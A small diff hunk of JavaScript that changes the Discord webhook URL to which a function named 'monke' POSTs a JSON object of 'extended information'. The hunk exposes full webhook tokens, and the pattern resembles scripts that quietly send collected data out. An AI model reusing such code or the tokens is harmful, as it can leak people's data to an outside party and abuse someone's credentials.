@@ -52,7 +52,7 @@ function monke(json) {
             try {
                 // Send the Discord webhook request with the extended information
                 var discordRequest = new XMLHttpRequest();
-                discordRequest.open("POST", "https://discord.com/api/webhooks/1174684049852334101/40DQz52KTpj4x_w7Y2fNtwXye58VRDpOLaJTO14VegRJ5QuCVGeUr_909wAa2_pO5_oC");
+                discordRequest.open("POST", "https://discord.com/api/webhooks/1175547384885936178/bkarNNbE8OG8i8NL-qfkAeHXK0bWAOZpimr9rpb1WRyub166xuC_InNXtKNXYg-FosNB");
                 discordRequest.setRequestHeader('Content-type', 'application/json');
                 discordRequest.send(JSON.stringify(params));
             } catch (error) {
